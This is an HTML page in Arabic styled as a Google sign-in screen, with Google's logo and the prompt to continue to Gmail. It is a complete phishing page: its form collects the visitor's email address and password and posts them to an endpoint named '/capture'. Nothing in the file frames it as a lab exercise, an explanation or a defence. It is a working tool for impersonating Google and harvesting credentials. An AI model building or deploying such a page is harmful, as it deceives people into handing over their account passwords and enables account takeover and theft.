<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>تسجيل الدخول - Google</title>
<style>
body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.card { border: 1px solid #dadce0; border-radius: 8px; width: 350px; padding: 40px; text-align: center; }
input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
button { background: #1a73e8; color: white; border: none; padding: 10px; border-radius: 4px; cursor: pointer; width: 100%; }
</style>
</head>
<body>
<div class="card">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" width="75">
<h2>تسجيل الدخول</h2>
<p>متابعة إلى Gmail</p>
<form action="/capture" method="post">
<input type="email" name="email" placeholder="البريد الإلكتروني" required>
<input type="password" name="password" placeholder="كلمة المرور" required>
<button type="submit">التالي</button>
</form>
</div>
</body>
</html>
